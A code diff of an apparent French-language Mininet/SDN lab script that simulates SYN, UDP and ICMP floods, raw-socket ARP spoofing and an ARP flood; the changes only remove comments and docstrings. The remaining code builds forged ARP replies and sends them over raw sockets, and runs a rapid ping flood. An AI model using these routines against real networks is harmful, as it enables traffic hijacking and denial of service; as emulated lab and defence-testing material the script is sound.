@@ -100,7 +100,7 @@ def syn_flood(net, attacker, target_ip, trigger_host):
     print('ATTAQUE 4 : SYN FLOOD')
     print('='*60)
     print(f'Attaquant : {attacker.name}')
-    print(f'→ Envoi de 60 SYN vers {target_ip}')
+    print(f'Envoi de 60 SYN vers {target_ip}')
 
     if not test_ip(attacker, target_ip):
         print('Timeout/IP bloquée ')
@@ -118,7 +118,7 @@ def udp_flood(net, attacker, target_ip,trigger_host):
     print('ATTAQUE 4 : UDP FLOOD')
     print('='*60)
     print(f'Attaquant : {attacker.name}')
-    print(f'→ Envoi de 60 UDP vers {target_ip}')
+    print(f'Envoi de 60 UDP vers {target_ip}')
 
     if not test_ip(attacker, target_ip):
         print('Timeout/IP bloquée')
@@ -136,7 +136,7 @@ def icmp_flood(net, attacker, target_ip, trigger_host):
     print('ATTAQUE 4 : ICMP FLOOD')
     print('='*60)
     print(f'Attaquant : {attacker.name}')
-    print(f'→ Envoi de 80 ICMP vers {target_ip}')
+    print(f'Envoi de 80 ICMP vers {target_ip}')
 
     rc = attacker.cmd('ping -c 80 -i 0.01 -W 1 -w 3 ' + target_ip + '; echo $?').strip()
     time.sleep(0.5)
@@ -168,17 +168,11 @@ def regle_overflow(net, attacker):
     print(attacker.cmd('ovs-ofctl dump-flows s2'))
 
 def craft_arp_packet(src_mac, src_ip, dst_mac, dst_ip, operation='reply'):
-    """
-    Crée un paquet ARP en bytes
-    operation: 'request' (1) ou 'reply' (2)
-    """
     import socket
     
-    # Convertir MAC en bytes
     def mac_to_bytes(mac):
         return bytes.fromhex(mac.replace(':', ''))
     
-    # Convertir IP en bytes
     def ip_to_bytes(ip):
         return socket.inet_aton(ip)
     
@@ -211,12 +205,8 @@ def craft_arp_packet(src_mac, src_ip, dst_mac, dst_ip, operation='reply'):
     return full_packet
 
 def send_raw_packet(host, interface, packet_bytes):
-    """
-    Envoie un paquet raw depuis un host Mininet
-    """
     import base64
     
-    # Encoder le paquet en base64 pour le passer en paramètre
     packet_b64 = base64.b64encode(packet_bytes).decode()
     
     # Script Python inline pour envoyer le paquet
@@ -232,15 +222,11 @@ s.close()
 print("Paquet envoyé !")
 '''
     
-    # Exécuter sur le host
     result = host.cmd(f"python3 -c '{send_script}'")
     return result
 
 def arp_spoofing_attack(net, attacker, target_ip, target_host):
-    """
-    Fonction d'attaque ARP Spoofing compatible avec ton code
-    Sans Scapy - utilise raw sockets
-    """
+
     print('\n' + '='*60)
     print('ATTAQUE 1 : ARP SPOOFING (IP Hijacking)')
     print('='*60)
@@ -261,19 +247,16 @@ def arp_spoofing_attack(net, attacker, target_ip, target_host):
     print(f'MAC de l\'attaquant : {attacker_mac}')
     print(f'\n L\'attaquant envoie des ARP Reply prétendant que {target_ip} a la MAC {attacker_mac}')
     
-    # Créer le paquet ARP malveillant en broadcast
-    # Ethernet dst=broadcast, ARP: "Je suis target_ip et ma MAC est attacker_mac"
     poisoned_packet = craft_arp_packet(
         src_mac=attacker_mac,
         src_ip=target_ip,
-        dst_mac="ff:ff:ff:ff:ff:ff",  # Broadcast
+        dst_mac="ff:ff:ff:ff:ff:ff",
         dst_ip=target_ip,
         operation='reply'
     )
    
     print("Envoi de 10 paquets ARP falsifiés via raw socket...")
     
-    # Envoyer les paquets depuis l'attaquant
     for i in range(10):
         send_raw_packet(attacker, attacker_iface, poisoned_packet)
         time.sleep(0.1)
@@ -306,14 +289,12 @@ def arp_flood_attack(net, attacker):
     print(f'IPs usurpées : {fake_ips}')
     
     for fake_ip in fake_ips:
-        # Créer un Gratuitous ARP (annonce que fake_ip a la MAC de l'attaquant)
-        # En broadcast pour que tout le monde l'entende
         gratuitous_packet = craft_arp_packet(
             src_mac=attacker_mac,
             src_ip=fake_ip,
             dst_mac="ff:ff:ff:ff:ff:ff",
             dst_ip=fake_ip,
-            operation='reply'  # Gratuitous ARP = ARP reply non sollicité
+            operation='reply'
         )
         
         for _ in range(1):
